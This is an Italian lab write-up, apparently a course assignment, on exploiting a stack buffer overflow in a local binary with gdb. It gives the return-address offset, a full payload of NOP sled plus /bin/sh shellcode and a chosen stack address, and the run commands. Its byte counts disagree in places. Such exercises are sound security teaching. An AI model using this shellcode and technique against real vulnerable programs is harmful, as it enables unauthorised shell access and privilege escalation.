Lancio dell'eseguibile con gdb, trovo indirizzo strcpy usando info functions: 0x56556030.

Colloco a questo indirizzo un breakpoint per poter esaminare lo stack durante l'esecuzione.
Con vari tentativi scopro che riesco a sovrascrivere l'inizio  dell'indirizzo di ritorno dando 623 caratteri.

Per sovrascrivere l'indirizzo di ritorno completamente uso 626 caratteri:
run $(python -c "print('A'*622+'BBBB')")

Nell'immagine overflow.png si vede come l'indirizzo di ritorno risulti sovrascritto dalle B(42) inserite come payload

A questo punto compongo il payload nel seguente modo: 46 byte sono di shellcode, 4 di indirizzo di ritorno, i restanti di NOP. Il numero di byte totali da dare per sovrascrivere completamente l'indirizzo di ritorno è 624 byte, quindi il numero di NOP(\x90) da inserire è di 576 byte. 
Payload:
run $(python -c "print('\x90'*576+'\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\xb0\xd2\xff\xff')")

L'indirizzo di ritorno lo scelgo controllando lo stack con x/700xw $esp, in particolare uso 0xffffd2b0 come indirizzo di ritorno perchè è molto probabile cadere nella zona dei NOP.
Quando metto l'indirizzo di ritorno nel payload lo scrivo in little endian

Nell'immagine final_shell.png si vede payload iniettato e shell eseguita come conseguenza del payload. L'immagine payload.png è uguale a questa perchè in entrambe si vedono sia payload che shell.
(Consegnare le due immagini serve se per qualche motivo non funziona l'exploit, e si può dimostrare di aver composto correttamente il payload pur non avendo raggiunto la shell).
